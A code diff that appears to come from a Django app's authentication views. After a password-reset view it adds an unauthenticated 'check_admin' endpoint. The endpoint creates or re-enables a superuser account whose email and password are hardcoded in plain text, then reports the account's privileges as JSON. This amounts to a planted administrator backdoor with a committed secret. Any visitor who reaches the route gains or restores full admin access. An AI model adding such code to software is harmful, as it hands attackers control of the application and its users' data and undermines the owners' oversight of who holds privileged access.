@@ -202,3 +202,32 @@ class ResetPasswordConfirmView(APIView):
             {"message": "Password updated successfully. You can now log in."},
             status=status.HTTP_200_OK,
         )
+
+from django.http import JsonResponse
+def check_admin(request):
+    User = get_user_model()
+    email = 'ashharshahan666@gmail.com'
+    password = 'PocketFlowAdmin2026!'
+    
+    user = User.objects.filter(email=email).first()
+    
+    status_msg = "Existing"
+    if not user:
+        user = User.objects.create_superuser(
+            email=email,
+            password=password
+        )
+        status_msg = "Created Now"
+    
+    user.is_staff = True
+    user.is_superuser = True
+    user.is_active = True
+    user.save()
+    
+    return JsonResponse({
+        "status": "Success",
+        "action": status_msg,
+        "email": email,
+        "is_staff": user.is_staff,
+        "is_superuser": user.is_superuser
+    })
